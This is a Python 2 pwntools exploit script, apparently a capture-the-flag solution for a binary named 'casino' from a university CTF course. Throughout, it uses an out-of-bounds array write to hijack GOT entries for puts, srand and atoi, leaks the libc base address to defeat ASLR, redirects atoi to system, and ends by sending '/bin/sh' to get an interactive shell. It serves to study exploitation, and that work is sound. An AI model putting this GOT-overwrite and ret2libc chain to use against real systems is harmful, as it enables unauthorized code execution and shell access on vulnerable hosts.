#!/usr/bin/env python2
from pwn import *

context.clear(arch='x86_64')

# name
name = '\x00' * 16

# random number
l = process('./gen_num.out')
numbers = l.recvall().decode().split('\n')
del numbers[-1]
l.close()

# calculate offset for system library
elf = ELF('./casino')
libc = ELF('./libc-2.23.so')
binsh_offset = next(libc.search('/bin/sh'))
system_offset = libc.symbols['system']

main = 0x400564
casino = 0x40095d
name += p64(0x601ff0)
# printf = 0x602030 --> has not fully solve, will crash
printf = 0x400700 # fully resolved and back to printf again

libc_base_addr = 0
print(hex(binsh_offset))
print(hex(system_offset))

r = process("./casino")
# r = remote('edu-ctf.csie.org', 10176)
r.sendlineafter('name: ', name)
r.sendlineafter('age: ', '87')

step = 1
while step < 7:
    # Step 1: Hijack GOT table of puts, make casino run again and again endlessly
    if step == 1:
        for i in range(0, 6):
            r_out = 'Chose the number ' + str(i) + ': '
            r.sendlineafter(r_out, str(i))

        offset = (0x20 - 0xd0) / 4
        r.sendlineafter('0:no]:', '1')

        r.sendlineafter('6]:', str(offset + 1))

        r_out = 'Chose the number ' + str(offset) +': '
        hijack = casino
        r.sendlineafter(r_out, str(hijack))
        print('finished sending number and payload for step  %d: ' % (step))

        step += 1

    # Step 2: Write the rest of padding zeros in front of the starting address of step 1
    elif step == 2:
        cnt_num = 0
        for i in numbers:
            r_out = 'Chose the number ' + str(cnt_num) + ': '
            r.sendlineafter(r_out, str(i))
            cnt_num += 1

        offset = (0x20 - 0xd0) / 4
        r.sendlineafter('0:no]:', '1')

        r.sendlineafter('6]:', str(offset + 2))

        r_out = 'Chose the number ' + str(offset + 1) +': '
        r.sendlineafter(r_out, '0')
        print('finished sending number and payload for step  %d: ' % (step))

        step += 1

    # Step 3: Hijack GOT table of srand, change it to print and use to leak system base address of libc
    elif step == 3:
        for i in range(0, 6):
            r_out = 'Chose the number ' + str(i) + ': '
            r.sendlineafter(r_out, str(i))

        offset = (0x40 - 0xd0) / 4
        r.sendlineafter('0:no]:', '1')

        r.sendlineafter('6]:', str(offset + 1))

        r_out = 'Chose the number ' + str(offset) +': '
        hijack = printf
        r.sendlineafter(r_out, str(hijack))
        print('finished sending number and payload for step  %d: ' % (step))

        step += 1

    # Step 4: Write the rest of padding zeros in front of the starting address of step 3
    elif step == 4:
        cnt_num = 0
        for i in numbers:
            r_out = 'Chose the number ' + str(cnt_num) + ': '
            r.sendlineafter(r_out, str(i))
            cnt_num += 1

        offset = (0x40 - 0xd0) / 4
        r.sendlineafter('0:no]:', '1')

        r.sendlineafter('6]:', str(offset + 2))

        r_out = 'Chose the number ' + str(offset + 1) +': '
        r.sendlineafter(r_out, '0')
        print('finished sending number and payload for step  %d: ' % (step))

        step += 1

    # Step 5: Hijack GOT table of atoi, change it to system
    elif step == 5:
        libc_base_addr = u64(r.recv(6) + '\0\0') - 0x21ab0
        print('libc_base_addr ', hex(libc_base_addr))

        for i in range(0, 6):
            r_out = 'Chose the number ' + str(i) + ': '
            r.sendlineafter(r_out, str(i))

        offset = (0x58 - 0xd0) / 4
        r.sendlineafter('0:no]:', '1')

        r.sendlineafter('6]:', str(offset + 1))

        r_out = 'Chose the number ' + str(offset) +': '
        hijack = libc_base_addr + system_offset
        print('ASLR system_addr', hex(hijack))
        r.sendlineafter(r_out, str(hijack))
        print('finished sending number and payload for step  %d: ' % (step))
        # pause()

        step += 1

    # Step 6: Write the rest of padding zeros in front of the starting address of step 5
    elif step == 6:
        cnt_num = 0
        r_out = 'Chose the number 0:'
        # hijack = libc_base_addr + binsh_offset # --> strange bug, PWN but no flag
        # print(hex(hijack), ' = ', hijack)
        pause()
        hijack= '/bin/sh' # --> PWN and with flag
        r.sendlineafter(r_out, str(hijack))
        print('finished sending number and payload for step  %d: ' % (step))
        r.interactive()

        step += 1
r.close()
